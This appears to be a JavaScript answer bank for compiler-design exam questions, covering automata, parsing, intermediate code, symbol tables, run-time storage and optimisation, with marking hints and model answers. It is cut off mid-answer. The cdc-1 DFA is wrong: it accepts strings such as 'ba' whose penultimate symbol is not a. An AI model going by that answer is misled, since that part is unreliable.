window.ANSWERS={"cdc-1":{"u":2,"logic":"Tests whether you know why the endmarker is added (a unique accepting position for the direct DFA construction) and whether you can build a DFA that remembers two symbols, not one. The penultimate-symbol trap catches students who build three states.","how":"Two lines on augmentation, then the 4-state table from memory: final state is the one reached after reading a. Never draw more than four states.","skel":["Important state = symbol leaf in syntax tree","Augment with # for one accept position","Thompson NFA, then subset construction","Four states A-D, C is final","Accept iff penultimate symbol is a"],"ans":"Important states: in the syntax tree of an augmented regular expression, every leaf holding a symbol is an important state, because it is the only position at which the automaton consumes a character. Leaves holding operators or ε are not important.\nAugmented regular expression: append a unique endmarker, giving r#. Needed because\n• it creates a distinct final position in the syntax tree, so the DFA has exactly one accepting state;\n• it marks the end of the token, so longest-match and accept decisions are well defined;\n• followpos of # supplies the accepting condition in the direct (syntax-tree) DFA construction.\nConverting (a+b)*a(a+b): Thompson gives the ε-NFA for (a|b)*, concatenated with a and then with (a|b). Subset construction merges its states into four, because the DFA only needs the last two symbols:\nA (start, nothing read): a→B, b→B\nB (one symbol read): a→C, b→D\nC (last symbol a): a→C, b→D  — final\nD (last symbol b): a→C, b→D\nFinal state C means the penultimate symbol was a; strings of length below two are rejected. Draw four circles with C double-circled."},"cdc-2":{"u":8,"logic":"Checks the leaders-to-blocks-to-edges procedure and whether you can state optimisation criteria (correctness, profitability, uniformity) instead of listing optimisations. Students lose marks by drawing a flowchart instead of a node-edge graph.","how":"Number the instructions, tick the leaders, then box the blocks. Draw the graph with a back edge — the back edge is the mark-earning detail.","skel":["Find leaders: first, jump targets, after jumps","Block = leader to next leader","Edge for fall-through and for jump","Need: speed, size, memory, cache","Criteria: correctness, profitability, uniformity"],"ans":"Basic block to flow graph:\n1. Find leaders — (i) the first instruction, (ii) every target of a jump, (iii) every instruction immediately after a jump.\n2. A basic block runs from a leader up to the instruction before the next leader.\n3. One node per block. Add an edge B1→B2 if B2 can execute immediately after B1: B1 ends in a jump to B2's leader, or B1 does not end in an unconditional jump and B2 is the next block. Add ENTRY and EXIT nodes.\nExample: in 1 read x; if i>x goto 13; 6 square=i*i; ... if i<=x goto 6, the block ending at the second test has two successors — the body and the exit — and the goto 6 becomes a back edge.\nNeed for optimisation: smaller and faster code, less memory and power, fewer registers, better cache and pipeline use, and removal of redundancy (common subexpressions, dead code, loop invariants) before code generation.\nCriteria: (i) correctness — semantics and observable behaviour must not change; (ii) profitability — the run-time gain must exceed compile-time and code-size cost; (iii) uniformity — apply it consistently so later passes do not undo it."},"cdc-3":{"u":3,"logic":"Three skills in one: knowing why recursive descent needs LL(1) grammars, writing semantic rules with a concatenation operator, and evaluating those rules on a tree. The tree is where most marks sit.","how":"Bullet the limitations, write the SDT with E.code and T.code, then draw the tree bottom-up writing the string at each node.","skel":["No left recursion, no ambiguity, needs left factoring","SDT: E.code = E1.code || T.code || +","Annotated tree, leaves are the digits","9-5 node gives 95-, root gives 95-2+"],"ans":"Limitations of recursive descent parsing:\n• Cannot handle left recursion (A→Aα) — the procedure calls itself for ever; the grammar must be rewritten first.\n• Cannot handle ambiguity or common prefixes; without left factoring it backtracks and can take exponential time.\n• One procedure per non-terminal, so deep grammars overflow the run-time stack.\n• Accepts only (mostly) LL(1) grammars; error recovery is ad hoc and semantic actions are hard to separate.\nSDT for infix to postfix (|| is string concatenation):\nE → E1 + T  { E.code = E1.code || T.code || '+' }\nE → E1 – T  { E.code = E1.code || T.code || '–' }\nE → T       { E.code = T.code }\nT → F       { T.code = F.code }\nF → (E)     { F.code = E.code }\nF → digit   { F.code = digit.lexeme }\nAnnotated parse tree for 9 – 5 + 2: the root is E→E+T, whose left child is E→E–T over 9 and 5. Values: 9 gives code '9', 5 gives '5', the minus node gives '95–', 2 gives '2', the root gives '95–2+'. Draw the tree with .code written beside every node."},"cdc-4":{"u":1,"logic":"Tests whether you can run one statement through all six phases and show the output of each, rather than reciting phase definitions. The type of 2.5 is the trap — it forces a coercion decision.","how":"Six labelled lines, one per phase, each with its output. Symbol table entry and the t1/t2/t3 temps buy the marks.","skel":["Lexical: seven tokens plus symbol table entries","Syntax: tree for ((A*B)+C)-2.5","Semantic: all real, no coercion needed","IR: t1, t2, t3 chain","Code: MOV, MUL, ADD, SUB"],"ans":"Statement A * B + C – 2.5, with A, B, C declared real.\n1. Lexical analysis: characters become tokens — <id,1> A, <mul>, <id,2> B, <plus>, <id,3> C, <minus>, <num,2.5>. A, B, C are entered in the symbol table as real; 2.5 goes in the literal table.\n2. Syntax analysis: the token stream is checked against the expression grammar and the parse tree is built with – at the root, + on its left child and 2.5 as the right child, and * below +.\n3. Semantic analysis: types are checked — real * real = real, real + real = real, real – real = real, so no coercion is inserted (an int operand would be widened to real here).\n4. Intermediate code: t1 = A * B; t2 = t1 + C; t3 = t2 – 2.5\n5. Optimisation: nothing applies — t2 is unknown at compile time, so 2.5 cannot be folded.\n6. Code generation: MOV R0,A; MUL R0,B; ADD R0,C; SUB R0,#2.5; MOV T,R0."},"cdc-5":{"u":2,"logic":"Vocabulary that recurs every year, plus the two conflicts that justify LR parsers. Students mix up token and lexeme; the examiner looks for one concrete source string for each conflict.","how":"Define the three terms in three lines with one shared example, then name both conflicts with a grammar that causes each. Two names = two marks.","skel":["Token = name plus attribute","Pattern = regex, lexeme = actual text","One example string for all three","Shift-reduce: dangling else","Reduce-reduce: two productions, same RHS"],"ans":"Token: a pair <token-name, attribute-value> returned by the lexical analyser, e.g. <id,1>.\nPattern: a description (regular expression) of the form lexemes of a token may take, e.g. letter(letter|digit)* for identifiers.\nLexeme: the actual character sequence matched. For count = count + 1 the lexemes are count, =, count, +, 1 and the tokens are <id,1>, <assign>, <id,1>, <plus>, <num,1>.\nConflicts in shift-reduce parsing:\n• Shift-reduce conflict — both shifting the next symbol and reducing the handle on top of the stack are possible. Caused by the dangling else (if E then if E then S else S) and by ambiguous grammars such as E→E+E|E*E.\n• Reduce-reduce conflict — two productions, A→α and B→α, can reduce the same handle.\nBoth are resolved by rewriting the grammar, by precedence and associativity declarations (yacc %left), or by a stronger parser (SLR/LALR) that uses a lookahead symbol."},"cdc-6":{"u":5,"logic":"Tests whether you can compare implementations by complexity, not just name them, and whether you know the hash table is the practical choice. Marks are for lookup/insert cost per structure.","how":"Five structures, one line each with its complexity, then one line on scope handling. Hash table last and underlined.","skel":["Record contents in one line","Linear list O(n), simplest","Sorted list, BST, trie costs","Hash table O(1) average, most used","Scope: stack of tables"],"ans":"Symbol table: a data structure holding one record per identifier — name, type, kind (variable/function), scope level, storage offset, size and line of declaration — with operations insert, lookup, update and delete on scope exit.\nData structures used:\n• Linear list (array or linked list): insert O(1) at the end, lookup O(n); simplest, adequate for small tables.\n• Sorted list: binary search gives O(log n) lookup, but insertion is O(n) because of shifting.\n• Binary search tree: O(log n) average insert and lookup, but degenerates to O(n) on sorted input; needs balancing (AVL) and supports ordered traversal.\n• Hash table: O(1) average insert and lookup, used by most compilers; needs a hash function (division, mid-square, folding) and collision handling by chaining or open addressing.\n• Trie: cost proportional to the length of the name; good when many identifiers share prefixes.\nScope is handled by a stack of tables, one per block, or by one table with a scope field that is undone when the block exits."},"cdc-7":{"u":7,"logic":"Tests evaluation order: A must be updated before A*C is computed, and * before –. Students who keep the old A or ignore precedence lose the question. MUL(A,E) also tests procedure-call code.","how":"One temporary per operator, left to right; obey assignment order. Write the quadruples underneath for extra marks.","skel":["t1 = B + C, t2 = t1 + D","A = t2 before A * C","t3 = A * C, t4 = D - t3","param A, param E, call MUL, 2","Add quadruples if time permits"],"ans":"Three-address code allows at most one operator on the right of an assignment. Given A = B + C + D; E = D – A * C; MUL(A, E):\nt1 = B + C\nt2 = t1 + D\nA = t2\nt3 = A * C\nt4 = D – t3\nE = t4\nparam A\nparam E\ncall MUL, 2\nOrder matters: A * C uses the new A, so t3 must come after A = t2, and * is evaluated before –. MUL(A,E) is a procedure call, not a multiplication — that is why it becomes param and call instructions.\nQuadruples (op, arg1, arg2, result):\n(+, B, C, t1)\n(+, t1, D, t2)\n(=, t2, –, A)\n(*, A, C, t3)\n(–, D, t3, t4)\n(=, t4, –, E)\n(param, A, –, –)\n(param, E, –, –)\n(call, MUL, 2, –)"},"cdc-8":{"u":2,"logic":"Tests whether you can read a grammar as a language. S→SS+|SS*|a is postfix notation; students who answer 'all strings over a,+,*' miss that the counts must balance.","how":"One line on parser duties, then say postfix and prove it with two example strings. Check the a-count against the operator count.","skel":["Parser: verify grammar, build tree, recover","Grammar is postfix over one operand a","One more a than operators","Give aa+ and aaa+* as examples","State which strings are excluded"],"ans":"Role of the parser (syntax analyser): it takes the token stream from the lexical analyser, verifies that the stream can be derived from the grammar, builds a parse tree or syntax tree, reports syntax errors and recovers from them, and passes the tree to semantic analysis. In syntax-directed translation it also drives the semantic actions.\nLanguage generated by S → SS+ | SS* | a:\n• S derives SS+, which is two operands followed by an operator — postfix notation, with a as the only operand and +, * as binary operators.\n• Therefore L(G) is the set of all valid postfix (suffix) arithmetic expressions built from a with binary + and *, i.e. the postfix forms of all fully parenthesised expressions over a.\n• Every string has exactly one more a than it has operators: 1 a and 0 operators (a), 2 a and 1 operator (aa+ = a+a), 4 a and 3 operators (aa+aa+* = (a+a)*(a+a)).\n• Strings such as +aa, a+, aa and aaa+ are not in L.\nThe grammar is unambiguous: a postfix expression has exactly one parse tree."},"cdc-9":{"u":2,"logic":"Pure LR(0) mechanics: augment, close, goto, repeat until no new set. The symmetric grammar makes it easy to forget that the recursive non-terminal re-enters the closure of I1 and I2.","how":"Augment, then close I0. Every goto on a or b re-closes and repeats the same two items — the pattern is I1, I2 reused.","skel":["Augment S' -> S","I0 closure has four items","I1 on a, I2 on b, I3 on d","I4 accept, then I5-I8 for the two S moves","Reuse I1, I2, I3 for the inner symbols"],"ans":"Augment the grammar: S' → S.\nI0 = closure({S'→•S}) = { S'→•S, S→•aSa, S→•bSb, S→•d }\nI1 = GOTO(I0,a) = { S→a•Sa, S→•aSa, S→•bSb, S→•d }\nI2 = GOTO(I0,b) = { S→b•Sb, S→•aSa, S→•bSb, S→•d }\nI3 = GOTO(I0,d) = { S→d• }\nI4 = GOTO(I0,S) = { S'→S• }   (accept)\nI5 = GOTO(I1,S) = { S→aS•a }\nI6 = GOTO(I5,a) = { S→aSa• }\nI7 = GOTO(I2,S) = { S→bS•b }\nI8 = GOTO(I7,b) = { S→bSb• }\nThe remaining transitions reuse the earlier sets: GOTO(I1,a)=I1, GOTO(I1,b)=I2, GOTO(I1,d)=I3, GOTO(I2,a)=I1, GOTO(I2,b)=I2, GOTO(I2,d)=I3. Nine item sets in all. No set contains both a shift item and a completed item, so the grammar is LR(0) and the parse table has no conflict."},"cdc-10":{"u":2,"logic":"Three short definitions with one worked rewrite each, plus type conversion. The examiner wants the transformed grammar, not just the words, and the widening/narrowing direction.","how":"Formula first, one rewrite under it, then two lines on conversion. Write A -> beta A-prime as the template and instantiate.","skel":["Left recursion loops a top-down parser","A -> beta A', A' -> alpha A' | eps","Left factoring removes common prefixes","Conversion: implicit widening safe, cast may lose","One example each"],"ans":"Left recursion: a production A → Aα | β in which the leftmost symbol of a body is A itself. A top-down parser calls A() without consuming input, so it recurses for ever. Remove it as\nA → βA',  A' → αA' | ε\ne.g. E → E+T | T becomes E → T E',  E' → +T E' | ε.\nLeft factoring: a production A → αβ1 | αβ2 whose alternatives share the prefix α, so a predictive parser cannot choose. Rewrite\nA → αA',  A' → β1 | β2\ne.g. S → if E then S else S | if E then S becomes S → if E then S S',  S' → else S | ε.\nType conversion:\n• Implicit (coercion) — inserted by the compiler; widening is safe: int → float → double.\n• Explicit (cast) — written by the programmer; narrowing may lose data: (int)2.7 gives 2, and (char)300 truncates.\nThe semantic analyser checks the types and inserts a conversion node in the annotated tree where needed."},"cdc-11":{"u":3,"logic":"Two attribute definitions plus a FOLLOW computation on a list grammar. FOLLOW(S) is the trap: L' can vanish, so ')' follows S as well as ',' and $.","how":"Define both attributes in one line each, then apply the three FOLLOW rules and write the reason beside each terminal.","skel":["Synthesized from children, inherited from parent/left","FIRST(S) = FIRST(L) = {(, b}","FIRST(L') = {comma, eps}","FOLLOW(S) = {comma, ), $}","FOLLOW(L) = FOLLOW(L') = {)}"],"ans":"Synthesized attribute: its value at a node is computed from the attribute values of that node's children — information flows bottom-up, e.g. E.val = E1.val + T.val.\nInherited attribute: its value is computed from the parent or from a sibling to the left — information flows top-down or across, e.g. L.inh = T.type in D → T L.\nGrammar: S → (L) | b,  L → S L',  L' → , S L' | ε\nFIRST: FIRST(S) = {(, b}, FIRST(L) = {(, b}, FIRST(L') = {',', ε}.\nFOLLOW(S): $ because S is the start symbol; ',' because L' can begin with a comma after S; and ')' because L' can derive ε and L is followed by ')' in S → (L). So FOLLOW(S) = {',', ')', $}.\nFOLLOW(L): ')' from S → (L). So FOLLOW(L) = {)}.\nFOLLOW(L'): L' occurs at the end of L → S L', so FOLLOW(L') = FOLLOW(L) = {)}.\nWrite the reason (rule used) beside each terminal — that is where the marks are, not in the final set."},"cdc-12":{"u":4,"logic":"Links type checking to real consequences (operator choice, storage size) and tests whether you know a DAG is not just a smaller tree — it shares nodes. Students draw two identical trees.","how":"Four reasons for checking, then a two-column contrast ending with one expression drawn both ways.","skel":["Catch errors at compile time","Pick correct operator and storage size","Tree: one node per subexpression","DAG: shared nodes, built by value numbering","Example with repeated b-c"],"ans":"Why type checking: to detect errors at compile time instead of run time — undeclared names, mismatched operands (int + string), wrong number or type of arguments, invalid array subscripts; to select the correct operator and instruction (integer vs floating-point add); to fix the storage size and offset of each variable; and to enforce the language's type rules, such as rejecting implicit pointer arithmetic.\nDAG vs syntax tree:\n• Syntax tree — one node per subexpression; a repeated subexpression appears as separate subtrees; it exactly mirrors the parse.\n• DAG — identical subexpressions share a single node that has several parents; it is built by value numbering or by hashing mknode calls.\n• A DAG is smaller, exposes common subexpressions for elimination, and lets us drop nodes with no parent (dead code); a tree cannot do any of this.\nExample: for a + a*(b–c) + (b–c)*d the subtree (b–c) appears twice in the syntax tree but once in the DAG, so the DAG has one node fewer."},"cdc-13":{"u":2,"logic":"Tests the hierarchy of LR parsers by what the item carries, and demands a concrete grammar where each weaker one breaks. Many students can define SLR but cannot produce the S->L=R failure.","how":"Rank them by power, then one bullet each: item form, conflict, and one failing grammar. The L=R example is the SLR proof.","skel":["Power: LR(0) < SLR < LALR < LR(1)","LR(0): no lookahead, shift-reduce on any completed item","SLR: reduce on FOLLOW, fails on S->L=R","LR(1): lookahead per item, state splits","LALR: merge cores, SLR size"],"ans":"All three are bottom-up LR parsers; they differ in what an item carries, hence in power and table size: LR(0) < SLR(1) < LALR(1) < LR(1).\n• LR(0): the item A→α•β has no lookahead, so a completed item is reduced on every terminal. Any state holding both a shift item and a completed item — e.g. E→E•+T and E→T• in E→E+T|T — is a shift-reduce conflict. LR(0) therefore fails on almost every practical grammar.\n• SLR(1): the same LR(0) item sets, but A→α• is reduced only when the lookahead lies in FOLLOW(A). It succeeds on most grammars and fails when FOLLOW is too coarse. Classic failure: S→L=R | R, L→*R | id, R→L. In the state {S→L•=R, R→L•}, '=' is in FOLLOW(R), so shifting '=' and reducing R→L conflict.\n• LR(1)/CLR(1): the item [A→α•β, a] carries the exact lookahead, so that state splits into {S→L•=R, =} and {R→L•, $} and the conflict disappears. Cost: many more states.\n• LALR(1): merges LR(1) states with the same core — LR(1) power at SLR table size; it can create a reduce-reduce conflict but never a shift-reduce one."},"cdc-14":{"u":2,"logic":"Tests the scanner's job and the two-buffer sentinel scheme with the reason it is fast. Most students describe the buffers but cannot explain the 1/N I/O saving or the single test per character.","how":"Role in three lines, then draw two boxes with the sentinel and both pointers. State the two efficiency reasons explicitly.","skel":["Scanner: chars to tokens, skip blanks and comments","Two buffers of N bytes, refilled alternately","Pointers lexemeBegin and forward","Sentinel removes the buffer-end test","Efficiency: one read per N characters"],"ans":"Role of the lexical analyser: it is the first phase. It reads the source characters, deletes white space and comments, groups the remaining characters into lexemes, and returns tokens <name, attribute> one at a time to the parser. It enters identifiers and constants in the symbol and literal tables, and reports illegal characters with their line numbers. In practice it is a DFA built from regular expressions (LEX).\nInput buffering: reading one character per I/O call is far too slow, so input is read in blocks and scanned from memory using two pointers, lexemeBegin (start of the current lexeme) and forward (the lookahead).\nBuffer-pair scheme with sentinels: two buffers of N bytes (N = 4096 typically) are used alternately. When forward reaches the end of one buffer, the other is refilled; if lexemeBegin is still in the exhausted buffer, the current lexeme is first copied to the start of the new one. Each buffer ends with a sentinel EOF character that cannot occur in the source.\nWhy it is efficient: (i) one read fills N characters, so I/O per character falls to 1/N; (ii) because the sentinel always stops the scan, the scanner needs only one test per character (*forward == EOF) instead of two end-of-buffer tests, and a refill happens only about once per N characters."},"cdc-15":{"u":3,"logic":"Tests the S vs L distinction through evaluation order, which is the real difference (bottom-up post-order vs one left-to-right pass). Defining L-attributed as 'has inherited attributes' is the common error.","how":"Define L by the restriction on inherited attributes, then contrast three points, then give one S and one L example SDD.","skel":["L: inherited depends only on left context","Evaluated in one left-to-right pass","S: synthesized only, post-order, works with LR","S example: E -> E1 + T","L example: D -> T L passes type down"],"ans":"L-attributed definition: an SDD in which every inherited attribute of a symbol on the right side of a production depends only on (i) attributes of symbols to its left in that production and (ii) inherited attributes of the head. Dependency arrows therefore never point rightwards, so the attributes can be evaluated in one left-to-right, depth-first pass — which is why L-attributed definitions suit top-down (predictive) translation.\nS-attributed definition: uses only synthesized attributes, so it is evaluated bottom-up in one post-order pass. Every S-attributed definition is L-attributed, but not conversely.\nDifferences:\n• Attributes — S: synthesized only; L: synthesized plus restricted inherited.\n• Evaluation — S: post-order, bottom-up; L: left-to-right with values passed down.\n• Parser — S: works with LR/yacc; L: works with LL and also bottom-up.\n• Power — L can pass type, scope and symbol-table context down; S cannot.\nExample S-attributed: E → E1 + T {E.val = E1.val + T.val}; F → digit {F.val = digit.lexval}.\nExample L-attributed: D → T L {L.inh = T.type}; L → id , L1 {L1.inh = L.inh; addtype(id.entry, L.inh)} — the declared type flows down the list."},"cdc-16":{"u":1,"logic":"Tests the block diagram with per-phase input and output, and whether you know the symbol table and error handler are cross-cutting, not phases. Students draw six boxes in a row and forget the two side boxes.","how":"Draw six boxes with input above and output below, then add the symbol table as a tall side box and the error handler underneath.","skel":["Six phases, input and output labelled","Analysis: lexical, syntax, semantic","Synthesis: IR, optimise, codegen","Symbol table accessed by all phases","Error handler recovers per phase"],"ans":"Block diagram — six boxes in a row, with the input of each written above and the output below, and the symbol table drawn as one tall box beside all six with two-way arrows.\n1. Lexical analyser: source characters → tokens; deletes blanks and comments, inserts names in the symbol table.\n2. Syntax analyser: tokens → parse tree; checks the grammar.\n3. Semantic analyser: parse tree + symbol table → annotated tree; type checks, inserts coercions.\n4. Intermediate code generator: annotated tree → three-address code.\n5. Code optimiser: IR → smaller, faster IR.\n6. Code generator: IR → target assembly, with register allocation.\nSymbol table interaction: the scanner inserts names, the parser looks up declarations, semantics checks type and scope, and code generation reads size and offset. Created before phase 1, used by all six.\nError handler interaction: each phase reports its own error class — illegal character, missing semicolon, type mismatch, too few registers — with a line number, then recovers (panic mode, deletion, insertion) so later phases can continue."},"cdc-17":{"u":1,"logic":"Tests the preprocessor's textual-substitution model and its danger: no type checking and duplicated evaluation. Students say 'a macro is a small function' and lose the comparison marks.","how":"Define, then four contrast points, then expand one nested macro fully — showing the parentheses is the mark.","skel":["Macro: textual substitution by preprocessor","No call overhead but code duplicated","Arguments substituted, not evaluated once","Expand CUBE(2) fully with parentheses","Result 8, wrong without brackets"],"ans":"Macro: a named piece of text, possibly with parameters, that the preprocessor substitutes textually into the source before compilation, e.g. #define SQUARE(x) ((x)*(x)).\nMacro vs procedure:\n• Expansion happens at preprocess time, a procedure is called at run time.\n• A macro has no call/return overhead, so it is faster, but its code is duplicated at every use (code bloat); a procedure has one copy.\n• Macro arguments are substituted textually, so SQUARE(i++) becomes ((i++)*(i++)) and increments twice; procedure arguments are evaluated once.\n• A macro has no type checking, no scope and no return type; a procedure has all three.\nExpansion example:\n#define SQUARE(x) ((x)*(x))\n#define CUBE(x) (SQUARE(x)*(x))\nresult = CUBE(2);\n→ result = ((((2)*(2)))*(2));  → 8.\nThe extra parentheses matter: with #define SQUARE(x) (x*x), CUBE(1+1) would expand to (1+1*1+1) = 3 instead of 4."},"cdc-18":{"u":2,"logic":"Tests the two LR set operations as procedures, not definitions, and whether you know when a production is NOT added to a closure (dot not before that non-terminal).","how":"State both algorithms in one line each, then compute. Say explicitly why B->.c is absent from closure(I0).","skel":["Closure: dot before B adds all B productions","Goto: move dot over X, then close","closure(I0) has S'->.S, S->.AB, A->.aA, A->.b","B absent because dot is before A","goto(I0,a) = A->a.A plus A->.aA, A->.b"],"ans":"closure(I): for every item [A→α•Bβ] in I, add every production of B as [B→•γ]; repeat until no new item appears. It collects all items that may be current without consuming input.\ngoto(I, X): take every item [A→α•Xβ] in I, move the dot over X to get [A→αX•β], and take the closure of that set — the state reached from I on symbol X.\nGiven I0 = {[S'→•S, $]} and grammar S→AB, A→aA | b, B→c:\nclosure(I0) = { S'→•S, S→•AB, A→•aA, A→•b }\nStep: the dot is before S, so the S production is added; its dot is before A, so both A productions are added. B→•c is not added, because no dot stands immediately before B.\ngoto(I0, a) = closure({A→a•A}) = { A→a•A, A→•aA, A→•b }\nStep: shift the dot over a; it now stands before A, so both A productions enter; a and b are terminals, so nothing further closes. This is the state reached on reading a."},"cdc-19":{"u":2,"logic":"Tests whether you can derive the three precedence relations from FIRST/LAST rather than memorising a table, and then run the stack machine on id+id*id. The shift at plus-then-star is the proof.","how":"Compute FIRST/LAST, fill the table, then six stack lines. The only pairing that matters is + versus *.","skel":["Relations from FIRST and LAST sets","Precedence: * over +, both left associative","Build the 6x6 table","Parse: shift, reduce to E, shift +","Plus < star is the key cell"],"ans":"The relations come from FIRST and LAST: a ⋖ b when a production has a B after a and b ∈ FIRST(B); a ⋗ b when a production has a B before b and a ∈ LAST(B); a ≐ b when a and b are adjacent (with at most one non-terminal between).\nTable (— means blank, < is ⋖, > is ⋗, = is ≐):\n      id   +   *   (   )   $\nid     —   >   >   —   >   >\n+      <   >   <   <   >   >\n*      <   >   >   <   >   >\n(      <   <   <   <   =   —\n)      —   >   >   —   >   >\n$      <   <   <   <   —   —\nParsing id + id * id:\n$ | id+id*id$ : $ ⋖ id, shift → $ id\nid ⋗ + : reduce F→id, T→F, E→T → $ E\n$ ⋖ + : shift → $ E +\n+ ⋖ id : shift → $ E + id\nid ⋗ * : reduce to T → $ E + T\n+ ⋖ * : shift → $ E + T *\n* ⋖ id : shift → $ E + T * id\nid ⋗ $ : reduce to F; * ⋗ $ : reduce T*F→T; + ⋗ $ : reduce E+T→E → $ E, accept.\nThe + ⋖ * entry is essential: it makes the parser shift the higher-precedence operator instead of reducing (id+id)*id."},"cdc-20":{"u":5,"logic":"Tests comparison by complexity plus one numeric hash computation. The marks are in the ASCII arithmetic and the chaining rule, not in the definition.","how":"Three structures in one line each, pick hash as the answer, then five arithmetic lines with mod 7. Show the bucket list.","skel":["Define table and operations","Compare list, hash, BST by cost","Hash table is fastest on average","Sum ASCII, take mod 7","Buckets 0,2,3,4,5; no collision"],"ans":"Symbol table: a table with one record per identifier holding name, type, kind, scope, storage offset, size and line of declaration; operations are insert, lookup, update and delete on scope exit.\nComparison:\n• Linear list — lookup O(n), insert O(1); simplest, for very small tables.\n• Hash table — O(1) average insert and lookup; needs a hash function and collision handling.\n• BST — O(log n) average, O(n) if skewed; supports ordered traversal.\nThe hash table is most efficient because its cost is independent of the number of names; a poor hash function or high load factor degrades it.\nHash function h(x) = (sum of ASCII values) mod 7:\nsum = 115+117+109 = 341 → 341 mod 7 = 5\ncount = 99+111+117+110+116 = 553 → 0\navg = 97+118+103 = 318 → 3\ntotal = 116+111+116+97+108 = 548 → 2\ntemp = 116+101+109+112 = 438 → 4\nBuckets: 0 → count, 2 → total, 3 → avg, 4 → temp, 5 → sum. No two names collide here; under chaining a colliding name would simply be inserted at the head of its bucket's linked list."},"cdc-21":{"u":6,"logic":"Tests the frame layout in address order and the difference between control link and access link, which students routinely swap. The factorial snapshot checks that you know what is live at depth three.","how":"Draw the stack of seven fields bottom-to-top with a label each, then draw four frames stacked for factorial(3).","skel":["Frame = one call's storage on the stack","Order: temporaries, locals, status, links, params, result","Control link = caller, access link = enclosing scope","factorial(3) chain gives four frames","At f(1): n=1, return 1"],"ans":"Activation record (frame): the block of storage pushed on the run-time stack for one invocation of a procedure. Layout, low address to high:\n• Temporaries — compiler-generated intermediate values.\n• Local data — variables declared inside the procedure.\n• Saved machine status — return address (PC), old FP and SP, saved registers.\n• Access link (static link) — points to the frame of the lexically enclosing procedure; used to reach non-local variables.\n• Control link (dynamic link) — points to the caller's frame; followed on return to restore the caller.\n• Actual parameters — the arguments supplied by the caller.\n• Return value — space for the value handed back to the caller.\nActivation tree for factorial(3): main → factorial(3) → factorial(2) → factorial(1). When factorial(1) is executing, four frames are on the stack. Its frame holds n = 1, the return address inside factorial(2), a control link to factorial(2)'s frame (the caller), an access link to main's frame (C has no nested procedures, so it equals the control link), saved registers, and the return value 1. Draw the frames stacked with factorial(1) on top."},"cdc-22":{"u":9,"logic":"Tests whether you can apply a local rewrite pass to given assembly rather than list techniques. Each line of the given code is chosen to trigger exactly one technique.","how":"Define in one line, name four techniques, then rewrite the nine instructions line by line and count them down to five.","skel":["Peephole: small window, local rewrite","Redundant load, constant folding","Strength reduction, machine idioms","Delete reload and add-zero","Nine instructions become five"],"ans":"Peephole optimisation: a local, machine-dependent pass that examines a small sliding window of target instructions and replaces a pattern with a shorter or faster equivalent, repeating until no window changes, without altering the meaning.\nTechniques: redundant load/store elimination (a value already in a register need not be reloaded), constant folding (compute constants at compile time), strength reduction (multiply by a power of two becomes a shift), use of machine idioms (auto-increment addressing), and removal of unreachable code and jumps to jumps.\nApplied to the given code:\nMOV R0,a ; MOV b,R0 — both needed (load a, store it)\nMOV R0,b — redundant load, b is already in R0: delete\nADD R0,R0,#0 — identity: delete\nMUL R0,R0,#2 — strength reduction → LSL R0,R0,#1\nMOV R1,#10 ; ADD R1,R1,#5 — constant folding → MOV R1,#15\nMOV R2,#0 ; ADD R2,R2,R1 — becomes MOV R2,R1\nOptimised code: MOV R0,a; MOV b,R0; LSL R0,R0,#1; MOV R1,#15; MOV R2,R1 — nine instructions reduced to five, with no change in the computed values."},"cdc-23":{"u":8,"logic":"Tests leader identification on real numbered code, including the target of a backward jump, and whether you can honestly conclude that no loop-invariant code exists. Students invent an invariant to fill space.","how":"Number all thirteen lines first, mark leaders, box three blocks, then draw four arrows. Say plainly there is no invariant.","skel":["Number lines 1 to 13","Leaders: 1, 6, 11","B1 = 1-5, B2 = 6-10, B3 = 11-13","Edges: B1-B2, B1-B3, B2-B2, B2-B3","No loop-invariant code: square uses i"],"ans":"Number the instructions 1 to 13. Leaders are 1 (first instruction), 6 (target of goto 6) and 11 (the instruction after a jump). So the basic blocks are:\nB1 = 1–5: read x; i=1; sum=0; prod=1; if i>x goto 13\nB2 = 6–10: square=i*i; sum=sum+square; prod=prod*i; i=i+1; if i<=x goto 6\nB3 = 11–13: write sum; write prod; halt\nFlow graph: B1→B2 when the test falls through (i ≤ x), B1→B3 when goto 13 is taken, B2→B2 by the back edge from goto 6, and B2→B3 when its test falls through. Draw three boxes with these four arrows; the self-loop on B2 is the loop.\nLoop-invariant code: none. square = i*i changes on every iteration, sum and prod are accumulators that must be updated inside the loop, and read x is already outside it. Moving any of these out would change the result, so no code motion is valid here."},"cdc-24":{"u":4,"logic":"Two short notes in one question: type checking timing and attribute flow direction. Examiners want an example per note — a definition alone earns half.","how":"Two headings, two definitions, one example each. Half a page, no more; the marks are for the example.","skel":["Static: at compile time, no run-time cost","Dynamic: at run time, errors late","Example per kind","Synthesized flows up, evaluated post-order","Inherited flows down, example D -> T L"],"ans":"(a) Type checking — static vs dynamic:\nStatic checking is done by the compiler at compile time from declarations, so errors appear before execution and add no run-time cost. Example: in C or Java, x = true + 1; is a compile-time error.\nDynamic checking is done at run time on actual values, so it is flexible but costs time and reports errors late. Example: in Python, 1 + 'a' fails only when that line executes.\nStatic checking cannot catch everything (array bounds, division by zero); those are left to run time.\n(b) Synthesized vs inherited attributes:\nSynthesized — computed from the children, flows upward, evaluated in a post-order pass. Example: E → E1 + T {E.val = E1.val + T.val}.\nInherited — computed from the parent or a left sibling, flows downward, evaluated in a left-to-right pass. Example: D → T L {L.inh = T.type}, passing the type down the list.\nAn SDD using only the first kind is S-attributed; one whose inherited attributes depend only on the left context is L-attributed."},"cdc-25":{"u":2,"logic":"Tests ambiguity through the dangling else, its grammatical cure, and then the LL(1) table for the standard expression grammar. Students resolve the else with precedence but cannot write the matched/unmatched grammar.","how":"Two trees for the dangling else, then the matched/unmatched rewrite, then FIRST/FOLLOW and a compact table. Finish with the derivation.","skel":["Ambiguous = two parse trees for one string","Dangling else: else can bind to either if","Resolve: else matches nearest then","Rewrite with matched/unmatched non-terminals","LL(1) table after removing left recursion"],"ans":"Ambiguous grammar: a CFG is ambiguous if some string has two or more distinct parse trees, i.e. two leftmost derivations. E → E+E | E*E | id is ambiguous — id+id*id has two trees.\nDangling else: S → if E then S | if E then S else S | other. For if E1 then if E2 then S1 else S2 the else can attach to the inner if (nearest) or the outer one, giving two trees. Resolve it by the rule that else matches the nearest unmatched then (a parser prefers shift over reduce, or yacc precedence), or rewrite the grammar:\nstmt → matched | unmatched\nmatched → if E then matched else matched | other\nunmatched → if E then stmt | if E then matched else unmatched\nLL(1) table after removing left recursion: E→TE', E'→+TE' | ε, T→FT', T'→*FT' | ε, F→(E) | id. FIRST(E)=FIRST(T)=FIRST(F)={(, id}; FOLLOW(E)=FOLLOW(E')={), $}; 